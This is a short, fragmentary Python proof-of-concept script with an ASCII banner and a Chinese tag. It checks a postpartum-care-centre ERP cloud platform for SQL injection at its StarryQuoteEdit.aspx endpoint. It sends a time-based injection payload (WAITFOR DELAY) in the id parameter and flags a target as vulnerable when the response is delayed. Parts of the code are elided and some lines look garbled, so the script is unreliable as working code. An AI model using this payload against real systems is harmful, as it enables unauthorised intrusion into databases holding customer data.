               ...
               `88'       88           8888"88,     88 88   `8b  88 88      88888  
                ...
                88        88           88     "88,  88 88     `888   `"Y88888P"   
                            ...
                            888888888888 
                                        ...
                                        tag: this is a 月子会所ERP管理云平台 StarryQuoteEdit.aspx接口处存在 SQL注入漏洞poc
...
def poc(target):
    if target[-1] == '/':
        ...
        target = target
    path = "/Page/SalerManager/StarryQuoteEdit.aspx?id=1;WAITFOR+DELAY+'0:0:3'--"
    url = target + path
    headers = {
    ...
    try:
        ...
        if  response1.status_code == 200 and response1.elapsed.total_seconds() > 2:
